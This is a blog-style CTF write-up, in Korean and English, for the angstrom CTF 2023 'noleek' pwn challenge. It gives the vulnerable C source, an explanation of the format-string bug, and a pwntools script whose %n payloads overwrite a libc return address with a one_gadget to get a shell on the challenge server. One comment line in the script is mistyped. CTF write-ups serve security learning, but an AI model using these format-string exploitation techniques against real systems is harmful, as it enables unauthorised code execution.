---
title: (CTF) angstrom CTF 2023 noleek writeup
categories: [CTF]
tags : [writeup]
date : 2023-04-27 13:29:42 +0900
author:
    name: 
    link: 
toc: true
comments: false
mermaid: false
math: false
---

Date: April 27, 2023
team: ST4RT

# noleek - PWN

```c
#include <stdio.h>
#include <stdlib.h>

#define LEEK 32

void cleanup(int a, int b, int c) {}

int main(void) {
    setbuf(stdout, NULL);
    FILE* leeks = fopen("/dev/null", "w");
    if (leeks == NULL) {
        puts("wtf");
        return 1;
    }
    printf("leek? ");
    char inp[LEEK];
    fgets(inp, LEEK, stdin);
    fprintf(leeks, inp);
    printf("more leek? ");
    fgets(inp, LEEK, stdin);
    fprintf(leeks, inp);
    printf("noleek.\\n");
    cleanup(0, 0, 0);
    return 0;
}

```

주어진 소스코드를 보면, fprintf 함수로 FSB 를 두 번 사용할 수 있다. 하지만 `/dev/null` 파일의 fd 에 출력해서, 출력을 확인할 수는 없다.
확인하려면, gdb 에서 leeks 변수의 버퍼를 확인하면 된다.

스택에 있는 값을 잘 활용해서, `__libc_start_main_ret` 을 `one_gadget` 으로 덮으면 된다. cleanup 함수를 호출해서 원가젯 조건을 맞춰주는 것을 볼 수 있다.

In the given source code, we can use FSB twice with the fprintf function. However, we can't see the output by printing to fd in the `/dev/null` file.
To do so, you can check the buffer of the leeks variable in gdb.

Using the value on the stack,  overwrite `__libc_start_main_ret` with `one_gadget`. You can see that the cleanup function is called to condition the original gadget.

- `%1$p` -> `rsp`
- `%12$p` -> `__libc_start_main_ret`
- `%16$p` -> `rsp+XX` -> `rsp+YY`
input `%p %p ...` and checked the index in gdb
exploit flow 는 다음과 같다.
1. overwrite stack pointer (rsp+YY) with rsp+56 to make rsp+XX point `__libc_start_main_ret`
2. overwrite `__libc_start_main_ret` with __libc_start_main_ret + (distance to one_gadget) using rsp+XX (pointing rsp+8)

rsp+XX -> %46$p ( local != server, check exploit file )

```python
from pwn import *

#r = process("./noleek")
r = remote("challs.actf.co",31400)
context.log_level='debug'

#### Local (Ubuntu22.04)
# 12=libc
# 16=stack pointer
$ 46=stack
####

#### Debian Docker
# libc = 0x23d0a
# one_gadget = 0xc9620
# diff = 678166
# 13 = stack pointer
# 12 = libc
# 42 = stack
####
pay1 = "%*1$c%56c%13$n"
pay2 = "%*12$c%678166c%42$n"

r.sendlineafter("? ",pay1)
r.sendlineafter("? ",pay2)

r.sendline("id")
r.sendline("id")
r.sendline("ls")
r.sendline("cat flag*")
r.interactive()

```

vfprintf_internal 을 분석해보면, %n 으로 write 할 때 int 값을 사용한다. 따라서 스택주소 4byte MSB!=1 && libc주소 4byte MSB !=1 을 만족해야 정상적인 값이 덮힌다.

또한, Ubuntu22.04, 문제서버에서 사용하는 Debian 스택구성이 살짝 달라서 Debian Docker 를 따로 빌드한 뒤 gdb 설치 후 디버깅해서 인덱스를 알아냈다.

Analyzing vfprintf_internal, it uses int when writing to %n. Therefore, the stack address 4byte MSB!=1 && libc address 4byte MSB !=1 must be satisfied to overwrite the correct value. So it requires some bruteforce ( 64 / 256 )

Also, the Debian (Used in the server) stack is a little different from my local environment, so I built Debian Docker separately, installed gdb, and debugged to find the index.